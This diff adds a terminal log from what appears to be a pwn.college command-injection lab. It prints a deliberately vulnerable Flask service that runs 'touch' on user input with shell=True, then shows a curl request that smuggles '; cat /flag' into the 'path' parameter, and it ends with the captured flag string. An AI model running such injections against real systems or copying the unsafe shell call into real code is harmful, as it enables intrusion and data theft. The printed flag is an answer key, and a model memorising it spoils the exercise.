@@ -1,0 +1,52 @@
+hacker@web-security~cmdi-5:~$ cat /challenge/server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/level", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("path", "/challenge/PWN")
+    command = f"touch {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the touch service! Please choose a file to touch:
+        <form action="/level"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Ran {command}!</b><br>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+
+hacker@web-security~cmdi-5:~$ curl "http://challenge.localhost:80/level?path=/;%20cat%20/flag%20>%20/home/hacker/flag;"
+DEBUG: command='touch /; cat /flag > /home/hacker/flag;'
+127.0.0.1 - - [19/Oct/2025 18:37:06] "GET /level?path=/;%20cat%20/flag%20>%20/home/hacker/flag; HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the touch service! Please choose a file to touch:
+        <form action="/level"><input type=text name=path><input type=submit value=Submit></form>
+        <hr>
+        <b>Ran touch /; cat /flag > /home/hacker/flag;!</b><br>
+        </body></html>
+        hacker@web-security~cmdat flag 
+pwn.college{cN5vqSngnh__2ENPBQgPp6Sh1Q7.ddjN1YDL1AjM5MzW}
